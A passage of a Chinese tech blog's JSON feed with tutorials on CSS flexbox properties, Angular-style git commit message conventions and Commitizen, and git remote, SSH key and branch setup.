五个值分别的作用</h4>\n<ul>\n<li>flex-start（默认值）左对齐</li>\n<li>flex-end: 右对齐</li>\n<li>center: 居中</li>\n<li>space-between: 两端对齐, 项目之间的间隔都相等。</li>\n<li>space-around: 每个项目两侧的间隔相等。所以, 项目之间的间隔比项目与边框的间隔大一倍。</li>\n</ul>\n<h3 id=\"align-items\" tabindex=\"-1\"> align-items</h3>\n<div><p>属性作用</p>\n<p><code>align-items</code> 属性定义项目在交叉轴上如何对齐。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>align-items</span><span>:</span> flex-start | flex-end | center | baseline | stretch<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-align.png\" alt=\"align-items\"></p>\n<h4 id=\"五个值分别的作用-1\" tabindex=\"-1\"> 五个值分别的作用</h4>\n<ul>\n<li>flex-start: 交叉轴的起点对齐。</li>\n<li>flex-end: 交叉轴的终点对齐。</li>\n<li>center: 交叉轴的中点对齐。</li>\n<li>baseline: 项目的第一行文字的基线对齐。</li>\n<li>stretch（默认值）如果项目未设置高度或设为 auto, 将占满整个容器的高度。</li>\n</ul>\n<h3 id=\"align-content\" tabindex=\"-1\"> align-content</h3>\n<div><p>属性作用</p>\n<p><code>align-content</code> 属性定义了多根轴线的对齐方式。如果项目只有一根轴线, 该属性不起作用。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>align-content</span><span>:</span> flex-start | flex-end | center | space-between | space-around |\n    stretch<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-content.png\" alt=\"align-content\"></p>\n<h4 id=\"六个值分别的作用\" tabindex=\"-1\"> 六个值分别的作用</h4>\n<ul>\n<li>flex-start: 与交叉轴的起点对齐。</li>\n<li>flex-end: 与交叉轴的终点对齐。</li>\n<li>center: 与交叉轴的中点对齐。</li>\n<li>space-between: 与交叉轴两端对齐, 轴线之间的间隔平均分布。</li>\n<li>space-around: 每根轴线两侧的间隔都相等。所以, 轴线之间的间隔比轴线与边框的间隔大一倍。</li>\n<li>stretch（默认值）轴线占满整个交叉轴。</li>\n</ul>\n<h2 id=\"项目的属性\" tabindex=\"-1\"> 项目的属性</h2>\n<p>以下 6 个属性设置在项目上。</p>\n<ul>\n<li><strong>order</strong></li>\n<li><strong>flex-grow</strong></li>\n<li><strong>flex-shrink</strong></li>\n<li><strong>flex-basis</strong></li>\n<li><strong>flex</strong></li>\n<li><strong>align-self</strong></li>\n</ul>\n<h3 id=\"order\" tabindex=\"-1\"> order</h3>\n<div><p>属性作用</p>\n<p><code>order</code> 属性定义项目的排列顺序。数值越小, 排列越靠前, 默认为 0。</p>\n</div>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>order</span><span>:</span> &lt;integer><span>;</span>\n  <span>/* default 0 */</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-order.png\" alt=\"order\"></p>\n<h3 id=\"flex-grow\" tabindex=\"-1\"> flex-grow</h3>\n<div><p>属性作用</p>\n<p><code>flex-grow</code> 属性定义项目的放大比例, 默认为 0, 即如果存在剩余空间, 也不放大。</p>\n</div>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>flex-grow</span><span>:</span> &lt;number><span>;</span>\n  <span>/* default 0 */</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-grow.png\" alt=\"flex-grow\"></p>\n<div><p>提示</p>\n<p>如果所有项目的 <code>flex-grow</code> 属性都为 1, 则它们将等分剩余空间（如果有的话）。如果一个项目的 <code>flex-grow</code> 属性为 2, 其他项目都为 1, 则前者占据的剩余空间将比其他项多一倍。</p>\n</div>\n<h3 id=\"flex-shrink\" tabindex=\"-1\"> flex-shrink</h3>\n<div><p>属性作用</p>\n<p><code>flex-shrink</code> 属性定义了项目的缩小比例, 默认为 1, 即如果空间不足, 该项目将缩小。剩余空间将比其他项多一倍。</p>\n</div>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>flex-shrink</span><span>:</span> &lt;number><span>;</span>\n  <span>/* default 1 */</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-shrink.jpg\" alt=\"flex-shrink\"></p>\n<div><p>提示</p>\n<p>如果所有项目的 <code>flex-shrink</code> 属性都为 1, 当空间不足时, 都将等比例缩小。如果一个项目的 flex-shrink 属性为 0, 其他项目都为 1, 则空间不足时, 前者不缩小。负值对该属性无效。</p>\n</div>\n<h3 id=\"flex-basis\" tabindex=\"-1\"> flex-basis</h3>\n<div><p>属性作用</p>\n<p><code>flex-basis</code> 属性定义了在分配多余空间之前, 项目占据的主轴空间（main size）。浏览器根据这个属性, 计算主轴是否有多余空间。它的默认值为 auto, 即项目的本来大小。</p>\n</div>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>flex-basis</span><span>:</span> &lt;length> | auto<span>;</span>\n  <span>/* default auto */</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>它可以设为跟 <code>width</code> 或 <code>height</code> 属性一样的值（比如 350px）, 则项目将占据固定空间。</p>\n<h3 id=\"flex\" tabindex=\"-1\"> flex</h3>\n<div><p>属性作用</p>\n<p><code>flex</code> 属性是 <code>flex-grow</code> , <code>flex-shrink</code> 和 <code>flex-basis</code> 的简写, 默认值为 <code>0 1 auto</code> 。后两个属性可选。</p>\n</div>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>flex</span><span>:</span> none | [ &lt; <span>\"flex-grow\"</span> > &lt; <span>\"flex-shrink\"</span> >? || &lt; <span>\"flex-basis\"</span> >]<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>该属性有两个快捷值: <code>auto (1 1 auto)</code> 和 <code>none (0 0 auto)</code> 。 建议优先使用这个属性, 而不是单独写三个分离的属性, 因为浏览器会推算相关值。</p>\n</div>\n<h3 id=\"align-self\" tabindex=\"-1\"> align-self</h3>\n<div><p>属性作用</p>\n<p><code>align-self</code> 属性允许单个项目有与其他项目不一样的对齐方式, 可覆盖 <code>align-items</code> 属性。默认值为 <code>auto</code> , 表示继承父元素的 <code>align-items</code> 属性, 如果没有父元素, 则等同于 <code>stretch</code> 。 :::</p>\n<div><pre><code><span>.item</span> <span>{</span>\n  <span>align-self</span><span>:</span> auto | flex-start | flex-end | center | baseline | stretch<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-self.png\" alt=\"align-self\"></p>\n<div><p>提示</p>\n<p>该属性可能取六个值, 除了 <code>auto</code> , 其他都与 <code>align-items</code> 属性完全一致。</p>\n</div>\n</div>\n",
      "image": "https://vxhly.github.io/assets/flex-layout.png",
      "date_published": "2016-08-11T14:27:56.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "git commit 规范指南",
      "url": "https://vxhly.github.io/views/manual/git-commit-specification-guide.html",
      "id": "https://vxhly.github.io/views/manual/git-commit-specification-guide.html",
      "summary": "前言\n目前, 社区有多种 Commit message 的写法规范。本文介绍 Angular 规范 是目前使用最广的写法, 比较合理和系统化, 并且有配套的工具。前前端框架 Angular.js 采用的就是该规范。\n\n",
      "content_html": "<div><p>前言</p>\n<p>目前, 社区有多种 Commit message 的写法规范。本文介绍 <a href=\"https://docs.google.com/document/d/1QrDFcIiPjSLDn3EL15IJygNPiHORgU1_OOAqWjiDU5Y/edit#heading=h.greljkmo14y0\" target=\"_blank\" rel=\"noopener noreferrer\">Angular 规范</a> 是目前使用最广的写法, 比较合理和系统化, 并且有配套的工具。前前端框架 <a href=\"https://github.com/angular/angular.js/blob/master/CONTRIBUTING.md#toc10\" target=\"_blank\" rel=\"noopener noreferrer\">Angular.js</a> 采用的就是该规范。</p>\n</div>\n\n<h2 id=\"commit-message-的作用\" tabindex=\"-1\"> Commit message 的作用</h2>\n<h3 id=\"提供更多的历史信息-方便快速浏览。\" tabindex=\"-1\"> 提供更多的历史信息, 方便快速浏览。</h3>\n<p>比如, 下面的命令显示上次发布后的变动, 每个 commit 占据一行。你只看行首, 就知道某次 commit 的目的。</p>\n<div><pre><code><span>git</span> log <span>&lt;</span>last tag<span>></span> HEAD --pretty<span>=</span>format:%s\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"可以过滤某些-commit-比如文档改动-便于快速查找信息\" tabindex=\"-1\"> 可以过滤某些 commit（比如文档改动）, 便于快速查找信息</h3>\n<div><pre><code><span>git</span> log <span>&lt;</span>last release<span>></span> HEAD --grep feature\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"可以直接从-commit-生成-change-log\" tabindex=\"-1\"> 可以直接从 commit 生成 Change log</h3>\n<p>Change Log 是发布新版本时, 用来说明与上一个版本差异的文档, 详见后文</p>\n<p><img src=\"/assets/git-commit-1.png\" alt=\"Change Log\"></p>\n<h3 id=\"其他优点\" tabindex=\"-1\"> 其他优点</h3>\n<ul>\n<li>可读性好, 清晰, 不必深入看代码即可了解当前 commit 的作用。</li>\n<li>为 Code Reviewing 做准备</li>\n<li>方便跟踪工程历史</li>\n<li>让其他的开发者在运行 git blame 的时候想跪谢</li>\n<li>提高项目的整体质量, 提高个人工程素质</li>\n</ul>\n<h2 id=\"commit-message-的格式\" tabindex=\"-1\"> Commit message 的格式</h2>\n<p>每次提交, Commit message 都包括三个部分: header, body 和 footer。</p>\n<div><pre><code><span>&lt;</span>type<span>></span><span>(</span><span>&lt;</span>scope<span>></span><span>)</span>: <span>&lt;</span>subject<span>></span>\n<span>&lt;</span>BLANK LINE<span>></span>\n<span>&lt;</span>body<span>></span>\n<span>&lt;</span>BLANK LINE<span>></span>\n<span>&lt;</span>footer<span>></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>其中, header 是必需的, body 和 footer 可以省略。 不管是哪一个部分, 任何一行都不得超过 72 个字符（或 100 个字符）。这是为了避免自动换行影响美观。</p>\n<h3 id=\"header\" tabindex=\"-1\"> Header</h3>\n<p>Header 部分只有一行, 包括三个字段: type（必需）、scope（可选）和 subject（必需）。</p>\n<h4 id=\"type\" tabindex=\"-1\"> type</h4>\n<p>用于说明 commit 的类别, 只允许使用下面 7 个标识。</p>\n<ul>\n<li><strong>feat</strong>: 一项新功能</li>\n<li><strong>fix</strong>: 修复一个 bug</li>\n<li><strong>docs</strong>: 仅仅修改文档（documentation）</li>\n<li><strong>style</strong>: 不影响代码含义的更改（空格, 格式, 缺少分号等）</li>\n<li><strong>refactor</strong>: 重构（即不是新增功能, 也不是修改 bug 的代码变动）</li>\n<li><strong>perf</strong>: 改进性能的代码更改</li>\n<li><strong>test</strong>: 添加缺失测试或更正现有测试</li>\n<li><strong>build</strong>: 影响构建系统或外部依赖项的更改（示例范围: gulp, broccoli, npm）</li>\n<li><strong>ci</strong>: 对 CI 配置文件和脚本的更改（示例范围: Travis, Circle, BrowserStack, SauceLabs）</li>\n<li><strong>chore</strong>: 其他不修改 src 或测试文件的更改</li>\n<li><strong>revert</strong>: 恢复之前的提交（即回滚）</li>\n</ul>\n<p>如果 type 为 <code>feat</code> 和 <code>fix</code> , 则该 commit 将肯定出现在 Change log 之中。其他情况（docs、chore、style、refactor、test）由你决定, 要不要放入 Change log, 建议是不要。</p>\n<h4 id=\"scope\" tabindex=\"-1\"> scope</h4>\n<p>scope 用于说明 commit 影响的范围, 比如数据层、控制层、视图层等等, 视项目不同而不同。</p>\n<p>例如在 Angular, 可以是 $location, $browser, $compile, $rootScope, ngHref, ngClick, ngView 等。</p>\n<p>如果你的修改影响了不止一个 scope, 你可以使用 <code>*</code> 代替。</p>\n<h4 id=\"subject\" tabindex=\"-1\"> subject</h4>\n<p>subject 是 commit 目的的简短描述, 不超过 50 个字符。</p>\n<p>其他注意事项:</p>\n<ul>\n<li>以动词开头, 使用第一人称现在时, 比如 change, 而不是 changed 或 changes</li>\n<li>第一个字母小写</li>\n<li>结尾不加句号（.）</li>\n</ul>\n<h3 id=\"body\" tabindex=\"-1\"> Body</h3>\n<p>Body 部分是对本次 commit 的详细描述, 可以分成多行。下面是一个范例。</p>\n<div><pre><code>More detailed explanatory text, if necessary. Wrap it to about 72 characters or so.\n\nFurther paragraphs come after blank lines.\n\n<span>-</span> Bullet points are okay, too\n<span>-</span> Use a hanging indent\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>有两个注意点:</p>\n<ul>\n<li>使用第一人称现在时, 比如使用 change 而不是 changed 或 changes。</li>\n<li>永远别忘了第 2 行是空行</li>\n<li>应该说明代码变动的动机, 以及与以前行为的对比。</li>\n</ul>\n<h3 id=\"footer\" tabindex=\"-1\"> Footer</h3>\n<p>Footer 部分只用于以下两种情况:</p>\n<h4 id=\"不兼容变动\" tabindex=\"-1\"> 不兼容变动</h4>\n<p>如果当前代码与上一个版本不兼容, 则 Footer 部分以 BREAKING CHANGE 开头, 后面是对变动的描述、以及变动理由和迁移方法。</p>\n<div><pre><code>BREAKING CHANGE: isolate scope bindings definition has changed.\n\n<span>    To migrate the code follow the example below:</span>\n\n<span>    Before:</span>\n\n<span>    scope: {\n      myAttr: 'attribute',\n    }</span>\n\n<span>    After:</span>\n\n<span>    scope: {\n      myAttr: '@',\n    }</span>\n\n<span>    The removed `inject` wasn't generaly useful for directives so there should be no code using it.</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"关闭-issue\" tabindex=\"-1\"> 关闭 Issue</h4>\n<p>如果当前 commit 针对某个 issue, 那么可以在 Footer 部分关闭这个 issue 。</p>\n<div><pre><code>Closes <span>#234</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"revert\" tabindex=\"-1\"> Revert</h4>\n<p>还有一种特殊情况, 如果当前 commit 用于撤销以前的 commit, 则必须以 revert: 开头, 后面跟着被撤销 Commit 的 Header。</p>\n<div><pre><code>revert: feat(pencil): add 'graphiteWidth' option\n\nThis reverts commit 667ecc1654a317a13331b17617d973392f415f02.\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>Body 部分的格式是固定的, 必须写成 <code>This reverts commit &lt;hash&gt;</code> ., 其中的 hash 是被撤销 commit 的 SHA 标识符。</p>\n<p>如果当前 commit 与被撤销的 commit, 在同一个发布（release）里面, 那么它们都不会出现在 Change log 里面。如果两者在不同的发布, 那么当前 commit, 会出现在 Change log 的 Reverts 小标题下面。</p>\n<h2 id=\"commitizen\" tabindex=\"-1\"> Commitizen</h2>\n<p>可以使用典型的 git 工作流程或通过使用 CLI 向导 Commitizen 来添加提交消息格式。</p>\n<p>安装</p>\n<div><pre><code><span>npm</span> <span>install</span> -g commitizen\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>然后, 在项目目录里, 运行下面的命令, 使其支持 Angular 的 Commit message 格式。</p>\n<div><pre><code>commitizen init cz-conventional-changelog --save --save-exact\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>以后, 凡是用到 <code>git commit</code> 命令, 一律改为使用 <code>git cz</code> 。这时, 就会出现选项, 用来生成符合格式的 Commit message。</p>\n<h2 id=\"生成-change-log\" tabindex=\"-1\"> 生成 Change log</h2>\n<p>如果你的所有 Commit 都符合 Angular 格式, 那么发布新版本时, Change log 就可以用脚本自动生成。生成的文档包括以下三个部分:</p>\n<div><pre><code>New features\n\nBug fixes\n\nBreaking changes.\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>每个部分都会罗列相关的 commit , 并且有指向这些 commit 的链接。当然, 生成的文档允许手动修改, 所以发布前, 你还可以添加其他内容。</p>\n<p><a href=\"https://github.com/ajoslin/conventional-changelog\" target=\"_blank\" rel=\"noopener noreferrer\">conventional-changelog</a> 就是生成 Change log 的工具, 运行下面的命令即可。</p>\n<div><pre><code><span>npm</span> <span>install</span> -g conventional-changelog-cli\n<span>cd</span> my-project\nconventional-changelog -p angular -i CHANGELOG.md -s -r <span>0</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>当然你也可以在你的 <code>package.json</code> 中添加快捷 script</p>\n<div><pre><code><span>{</span>\n  <span>\"script\"</span><span>:</span> <span>{</span>\n    <span>\"changelog\"</span><span>:</span> <span>\"conventional-changelog -p angular -i src/CHANGELOG.md -s -r 0\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/git-commit-1.png",
      "date_published": "2018-05-14T14:25:43.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "Git 远程推送配置",
      "url": "https://vxhly.github.io/views/manual/git-push-setting.html",
      "id": "https://vxhly.github.io/views/manual/git-push-setting.html",
      "summary": "前言\nGit 是一个开源的分布式版本控制系统, 可以有效、高速的处理从很小到非常大的项目版本管理。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Git 是一个开源的分布式版本控制系统, 可以有效、高速的处理从很小到非常大的项目版本管理。</p>\n</div>\n\n<h2 id=\"安装-git\" tabindex=\"-1\"> 安装 Git</h2>\n<p>如果你的系统还没有 Git, 请通过以下命令安装</p>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> <span>git</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"创建帐号\" tabindex=\"-1\"> 创建帐号</h2>\n<p>创建你的 GitHub 帐号, 或者 Git@OSC 帐号</p>\n<p><a href=\"http://github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub</a> 链接<br> <a href=\"http://git.oschina.net/\" target=\"_blank\" rel=\"noopener noreferrer\">Git@OSC</a> 链接</p>\n<h2 id=\"liunx-创建-ssh-密钥\" tabindex=\"-1\"> liunx 创建 SSH 密钥</h2>\n<div><pre><code>ssh-keygen -t rsa -C <span>\"xxxxx@xxxxx.com\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"添加-public-key\" tabindex=\"-1\"> 添加 public key</h3>\n<p>查看你的 public key, 并把它添加到您的账户中</p>\n<p>如 <a href=\"http://github.com/settings/keys\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub key</a> 如 <a href=\"http://git.oschina.net/profile/sshkeys\" target=\"_blank\" rel=\"noopener noreferrer\">Git@OSC key</a></p>\n<p>使用以下命令查看</p>\n<div><pre><code><span>cat</span> /home/youname/.ssh/id_rsa.pub\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"测试验证是否成功\" tabindex=\"-1\"> 测试验证是否成功</h3>\n<div><pre><code><span>ssh</span> -T git@github.com\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或</p>\n<div><pre><code><span>ssh</span> -T git@git.oschina.net\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>返回你在 <code>GitHub</code> 或 <code>Git@OSC</code> 上注册的用户名代表成功。</p>\n<h2 id=\"github-或-git-osc-上创建项目\" tabindex=\"-1\"> GitHub 或 Git@OSC 上创建项目</h2>\n<p><a href=\"http://github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub</a> 链接<br> <a href=\"http://git.oschina.net/\" target=\"_blank\" rel=\"noopener noreferrer\">Git@OSC</a> 链接</p>\n<h2 id=\"本地配置\" tabindex=\"-1\"> 本地配置</h2>\n<div><p>提示</p>\n<p>尽量保持你的名字和你的邮箱和 GitHub 或 Git@OSC 的注册一致。</p>\n</div>\n<div><pre><code><span>git</span> config --global user.name <span>\"your name\"</span>\n<span>git</span> config --global user.email <span>\"your email\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"配置大小写敏感\" tabindex=\"-1\"> 配置大小写敏感</h2>\n<div><p>提示</p>\n<p>在 Git 中默认是不区分大小的, 因此当你修改了文件名的大小写后, git 并不会认为你有修改哦, 使用下面的配置可开启大小写敏感</p>\n</div>\n<div><pre><code><span>git</span> config core.ignorecase <span>false</span> --global\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"本地多个-ssh-key-的配置\" tabindex=\"-1\"> 本地多个 ssh-key 的配置</h2>\n<p>在 <code>.ssh</code> 目录下面创建名为 <code>config</code> 的配置文件, 配置文件内容如下</p>\n<div><pre><code>Host me.github.com <span># 相当于 DNS 的作用</span>\n    HostName github.com <span># 解析的地址</span>\n    PreferredAuthentications publickey\n    IdentityFile ~/.ssh/me_rsa <span># 这是您生成密钥的文件名,注意是私钥的文件名</span>\n\nHost work.github.com <span># 相当于 DNS 的作用</span>\n    HostName github.com <span># 解析的地址</span>\n    Port <span>2222</span> <span># 如果你改变了 ssh 的端口号</span>\n    PreferredAuthentications publickey\n    IdentityFile ~/.ssh/work_rsa <span># 这是您生成密钥的文件名,注意是私钥的文件名</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>测试连接</code></p>\n<div><pre><code><span>ssh</span> -T git@me.github.com  <span># => 将会自动解析成 git@github.com</span>\n<span>ssh</span> -T git@work.github.com <span># => 将会自动解析成 git@github.com</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"常用命令\" tabindex=\"-1\"> 常用命令</h2>\n<h3 id=\"进入项目目录-初始化\" tabindex=\"-1\"> 进入项目目录, 初始化</h3>\n<div><pre><code><span>git</span> init\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"添加项目至本地仓库\" tabindex=\"-1\"> 添加项目至本地仓库</h3>\n<div><pre><code><span>git</span> <span>add</span> <span>.</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"提交并备注\" tabindex=\"-1\"> 提交并备注</h3>\n<div><pre><code><span>git</span> commit -m <span>\"first commit\"</span>\n<span>git</span> remote <span>add</span> origin git@github.com:<span>[</span>youName<span>]</span>/<span>[</span>appName<span>]</span>.git\n<span>git</span> push -u origin master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"解决冲突\" tabindex=\"-1\"> 解决冲突</h3>\n<div><pre><code><span>git</span> pull origin master\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"强制覆盖本地代码-更新本地源\" tabindex=\"-1\"> 强制覆盖本地代码（更新本地源）</h3>\n<div><pre><code><span>git</span> fetch --all\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"创建一个新的标签并提交\" tabindex=\"-1\"> 创建一个新的标签并提交</h3>\n<div><pre><code><span>git</span> tag -a v1.0.0 -m <span>\"test@1.0.0\"</span>\n<span>git</span> push origin --tags\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"查看本地标签\" tabindex=\"-1\"> 查看本地标签</h3>\n<div><pre><code><span>git</span> tag\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"删除远程-tag\" tabindex=\"-1\"> 删除远程 tag</h3>\n<div><pre><code><span>git</span> push origin --delete tag <span>[</span>tagname<span>]</span>\n<span>git</span> tag -d <span>[</span>tagname<span>]</span> <span># 删除本地 tag</span>\n<span>git</span> push origin :refs/tags/<span>[</span>tagname<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"获取远程-tag\" tabindex=\"-1\"> 获取远程 tag</h3>\n<div><pre><code><span>git</span> fetch origin tag <span>[</span>tagname<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"修改-remote\" tabindex=\"-1\"> 修改 remote</h3>\n<div><pre><code><span>git</span> remote set-url origin git@<span>[</span>URL<span>]</span>:<span>[</span>userName<span>]</span>/<span>[</span>projectName<span>]</span>\n<span># or</span>\n<span>git</span> remote <span>rm</span> origin\n<span>git</span> remote <span>add</span> origin git@<span>[</span>URL<span>]</span>:<span>[</span>userName<span>]</span>/<span>[</span>projectName<span>]</span>.git\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"查看远程分支\" tabindex=\"-1\"> 查看远程分支</h3>\n<div><pre><code><span>git</span> branch -a\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"查看本地分支\" tabindex=\"-1\"> 查看本地分支</h3>\n<div><pre><code><span>git</span> branch\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"创建本地分支\" tabindex=\"-1\"> 创建本地分支</h3>\n<div><pre><code><span>git</span> branch <span>[</span>branchName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"创建一个空分支\" tabindex=\"-1\"> 创建一个空分支</h3>\n<div><pre><code><span>git</span> branch --orphan <span>[</span>branchName<span>]</span> <span># 创建无历史提交的分支</span>\n<span>git</span> <span>rm</span> -rf <span>.</span> <span># 删除本地代码</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"删除远程分支\" tabindex=\"-1\"> 删除远程分支</h3>\n<div><pre><code><span>git</span> push origin --delete <span>[</span>branchName<span>]</span>\n<span># or</span>\n<span>git</span> push origin :<span>[</span>branchName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"本地分支推送到远程分支\" tabindex=\"-1\"> 本地分支推送到远程分支</h3>\n<div><pre><code><span>git</span> push origin <span>[</span>branchName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"切换分支\" tabindex=\"-1\"> 切换分支</h3>\n<div><pre><code><span>git</span> checkout <span>[</span>branchName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"合并分支\" tabindex=\"-1\"> 合并分支</h3>\n<div><pre><code><span>git</span> checkout master\n<span>git</span> merge <span>[</span>branchName<span>]</span>\n<span>git</span> push origin master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>如果分支合并时出现了冲突, 那么只能强上了</p>\n<div><pre><code><span>git</span> branch -m master old-master\n<span>git</span> branch -m <span>[</span>branchName<span>]</span> master\n<span>git</span> push -f origin master\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"submodule\" tabindex=\"-1\"> submodule</h3>\n<p>当项目越来越庞大之后, 不可避免的要拆分成多个子模块, 我们希望各个子模块有独立的版本管理, 并且由专门的人去维护, 这时候我们就要用到 git 的 submodule 功能。</p>\n<div><pre><code><span>git</span> clone <span>&lt;</span>repository<span>></span> --recursive 递归的方式克隆整个项目\n<span>git</span> submodule <span>add</span> <span>&lt;</span>repository<span>></span> <span>&lt;</span>path<span>></span> 添加子模块\n<span>git</span> submodule init 初始化子模块\n<span>git</span> submodule update 更新子模块\n<span>git</span> submodule foreach <span>git</span> pull 拉取所有子模块\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>删除子模块</p>\n<div><pre><code><span># 逆初始化模块, 其中{MOD_NAME}为模块目录, 执行后可发现模块目录被清空</span>\n<span>git</span> submodule deinit <span>{</span>MOD_NAME<span>}</span>\n<span># 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存）</span>\n<span>git</span> <span>rm</span> --cached <span>{</span>MOD_NAME<span>}</span>\n<span># 提交更改到代码库, 可观察到'.gitmodules'内容发生变更</span>\n<span>git</span> commit -am <span>\"Remove a submodule.\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>修改模块的 URL</p>\n<ol>\n<li>修改'.gitmodules'文件中对应模块的”url“属性;</li>\n<li>使用 <code>git submodule sync</code> 命令, 将新的 URL 更新到文件 <code>.git/config</code> # git 中配置 autocrlf</li>\n</ol>\n<h2 id=\"高级用法\" tabindex=\"-1\"> 高级用法</h2>\n<h3 id=\"批量修改历史-commit-的用户名和邮箱\" tabindex=\"-1\"> 批量修改历史 commit 的用户名和邮箱</h3>\n<div><pre><code><span>#!/bin/sh</span>\n\n<span>git</span> filter-branch --env-filter <span>'\n\nOLD_EMAIL=\"原邮箱地址\"\nCORRECT_NAME=\"新用户名\"\nCORRECT_EMAIL=\"新邮箱地址\"\n\nif [ \"$GIT_COMMITTER_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_COMMITTER_NAME=\"$CORRECT_NAME\"\n    export GIT_COMMITTER_EMAIL=\"$CORRECT_EMAIL\"\nfi\nif [ \"$GIT_AUTHOR_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_AUTHOR_NAME=\"$CORRECT_NAME\"\n    export GIT_AUTHOR_EMAIL=\"$CORRECT_EMAIL\"\nfi\n'</span> --tag-name-filter <span>cat</span> -- --branches --tags\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"换行符\" tabindex=\"-1\"> 换行符</h2>\n<h3 id=\"源文件中是换行符是-lf\" tabindex=\"-1\"> 源文件中是换行符是 